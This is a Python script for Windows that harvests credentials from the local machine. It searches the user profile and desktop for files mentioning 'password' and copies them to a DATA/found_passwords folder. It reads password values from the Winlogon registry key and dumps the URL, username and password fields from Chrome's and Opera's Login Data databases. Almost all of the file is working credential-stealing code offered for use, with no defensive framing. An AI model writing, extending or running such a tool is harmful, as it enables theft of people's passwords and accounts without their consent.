import os
import sqlite3
import subprocess
import winreg
import shutil
import colorlog
from contextlib import closing


def crash(error_id, function_no, error_content, type):
    """
    Ensure error_id and function_no are strings
    Prepare the data to write to the temporary files
    Write the name of the placeholder script to the temporary file
    Write the error message to the temporary file
    Write the name of the placeholder function to the temporary file
    Write the name of the placeholder language to the temporary file
    Write the name of the placeholder crash to the temporary file
    Write the type to the temporary file
    Open Crash_Reporter.py in a new shell window
    """
    # Ensure error_id and function_no are strings
    error_id = str(error_id)
    function_no = str(function_no)

    # Prepare the data to write to the temporary files
    script_name = os.path.basename(__file__)
    language = os.path.splitext(__file__)[1][1:]  # Extracting the language part

    # Write the name of the placeholder script to the temporary file
    with open("flag.temp", 'w') as f:
        f.write(script_name)

    # Write the error message to the temporary file
    with open("error.temp", 'w') as f:
        f.write(error_id)

    # Write the name of the placeholder function to the temporary file
    with open("function.temp", 'w') as f:
        f.write(function_no)

    # Write the name of the placeholder language to the temporary file
    with open("language.temp", 'w') as f:
        f.write(language)

    # Write the name of the placeholder crash to the temporary file
    with open("error_data.temp", 'w') as f:
        f.write(error_content)

    with open("type.temp", 'w') as f:
        f.write(type)

    # Open Crash_Reporter.py in a new shell window
    # Note: This command works for Command Prompt.
    # Adjust according to your needs.
    process = subprocess.Popen(r'powershell.exe -Command "& .\Crash_Reporter.py"', shell=True,  stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    for line in iter(process.stdout.readline, b''):
        decoded_line = line.decode('utf-8').strip()
        print(decoded_line)
    # Wait for the process to finish and get the final output/error
    stdout, _ = process.communicate()
    # Decode the output from bytes to string
    stdout = stdout.decode('utf-8') if stdout else ""
    print(stdout)


# Configure colorlog
logger = colorlog.getLogger()
logger.setLevel(colorlog.INFO)  # Set the log level
handler = colorlog.StreamHandler()
formatter = colorlog.ColoredFormatter(
    "%(log_color)s%(levelname)-8s%(reset)s %(blue)s%(message)s",
    datefmt=None,
    reset=True,
    log_colors={
        'DEBUG': 'cyan',
        'INFO': 'green',
        'WARNING': 'yellow',
        'ERROR': 'red',
        'CRITICAL': 'red,bg_white',
    }
)
handler.setFormatter(formatter)
logger.addHandler(handler)


def copy_file(src_path, dest_dir):
    """
    Copy a file from the source path to the destination directory.

    Args:
        src_path (str): The path of the source file.
        dest_dir (str): The destination directory.

    Returns:
        None
    """
    try:
        # Convert source path and destination directory to strings
        src_path = str(src_path)
        dest_dir = str(dest_dir)

        # Create destination directory if it doesn't exist
        if not os.path.exists(dest_dir):
            os.makedirs(dest_dir)

        # Get the destination path by joining the destination directory and the base name of the source path
        dest_path = os.path.join(dest_dir, os.path.basename(src_path))

        # Copy the file from the source path to the destination path
        shutil.copy2(src_path, dest_path)

        # Log the successful copy operation
        logger.info(f"Copied file to: {dest_path}")
    except Exception as e:
        # Log any errors that occur during the copy process
        logger.error(f"Error copying file: {e}")
        crash("OGE", "fun71", e, "error")


def search_filesystem():
    """
    Searches the file system for password files.

    This function searches the file system for files with extensions '.xml', '.ini', and '.txt'.
    If a file contains the word 'password' in its name or contents, it is logged as a found password file.
    The found password files are then copied to the 'DATA/found_passwords' directory.
    """
    logger.info("Searching the file system for passwords...")
    extensions = ['*.xml', '*.ini', '*.txt']
    for root, dirs, files in os.walk(os.environ['USERPROFILE']):
        for file in files:
            if any(extension in file for extension in extensions):
                file_path = os.path.join(root, file)
                if 'password' in file_path.lower() or 'password' in open(file_path).read().lower():
                    logger.info(f"Found password in file: {file_path}")
                    copy_file(file_path, "DATA/found_passwords")


def search_desktop():
    """
    Searches the desktop for password files.

    This function searches the desktop for files with names containing the word 'password'.
    If a file is found, it is logged as a found password file and then copied to the 'DATA/found_passwords' directory.
    """
    logger.info("Searching the desktop for password files...")
    desktop_path = os.path.join(os.environ['USERPROFILE'], "Desktop")
    for file in os.listdir(desktop_path):
        if "password" in file.lower():
            file_path = os.path.join(desktop_path, file)
            logger.info(f"Found password file on desktop: {file_path}")
            copy_file(file_path, "DATA/found_passwords")


def search_registry():
    """
    Searches the registry for passwords.

    This function searches the registry for values with keys containing the word 'password'.
    If a value is found, it is logged as a found password in the registry.
    """
    logger.info("Searching the registry for passwords...")
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
        i = 0
        while True:
            try:
                value = winreg.EnumValue(key, i)
                if "password" in value[0].lower():
                    logger.info(f"Found password in registry: {value[0]} = {value[1]}")
                i += 1
            except OSError:
                break
    except OSError:
        logger.warning("Registry search failed.")


def search_browser(browser_name, login_data_path):
    """
    Searches the login data of a specific browser for passwords.

    This function searches the login data of a specific browser for passwords.
    If the login data file is not found, a warning is logged.
    If the login data file is found, the function attempts to connect to the database and query for passwords.
    If passwords are found, they are logged.
    If no passwords are found, a warning is logged.
    If an error occurs while accessing the login data, an error is logged.
    """
    if not os.path.exists(login_data_path):
        logger.warning(
            f"{browser_name} Login Data file not found. Is {browser_name} installed and the 'Encrypt passwords' feature disabled?")
        return

    try:
        with closing(sqlite3.connect(login_data_path)) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            results = cursor.fetchall()

            if results:
                for result in results:
                    logger.info(
                        f"Found password in {browser_name}: URL = {result[0]}, Username = {result[1]}, Password = {result[2]}")
            else:
                logger.warning(f"No passwords found in {browser_name}.")
    except sqlite3.Error as e:
        logger.error(f"Error accessing {browser_name} Login Data: {e}")
        crash("EVE", "fun163", e, "error")


def main():
    """
    The main function that orchestrates the search operations.

    This function calls the search functions for registry, filesystem, desktop,
    Google Chrome browser, and Opera browser.
    """
    search_registry()  # Search passwords in the registry
    search_filesystem()  # Search passwords in the filesystem
    search_desktop()  # Search passwords on the desktop

    # Search passwords in Google Chrome browser
    search_browser("Google Chrome",
                   os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data",
                                "Default", "Login Data"))

    # Search passwords in Opera browser
    search_browser("Opera",
                   os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Opera Software", "Opera Stable",
                                "Login Data"))


if __name__ == "__main__":
    main()
